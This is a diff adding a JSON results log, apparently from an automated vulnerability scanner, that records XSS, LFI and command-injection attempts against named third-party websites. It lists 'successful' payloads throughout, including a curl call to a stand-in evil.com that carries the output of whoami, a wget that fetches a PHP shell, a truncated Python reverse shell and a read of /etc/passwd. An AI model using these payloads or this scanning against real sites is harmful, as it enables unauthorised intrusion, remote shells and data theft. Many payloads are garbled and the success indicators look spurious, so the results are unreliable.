+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "name",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "comment",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "message",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "redirect",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "callback",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        }
+      ],
+      "failed_attempts": 1,
+      "success_rate": 99.28571428571429
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "lfi",
+      "timestamp": "2025-10-28 13:01:46",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "xss",
+      "timestamp": "2025-10-28 13:01:26",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "rce",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [
+        {
+          "parameter": "cmd",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "exec",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "command",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "run",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "id",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "search",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 27736
+        },
+        {
+          "parameter": "search",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 27691
+        },
+        {
+          "parameter": "search",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 27703
+        },
+        {
+          "parameter": "search",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 27698
+        },
+        {
+          "parameter": "search",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 27699
+        },
+        {
+          "parameter": "search",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 27695
+        },
+        {
+          "parameter": "search",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 28133
+        },
+        {
+          "parameter": "search",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 27700
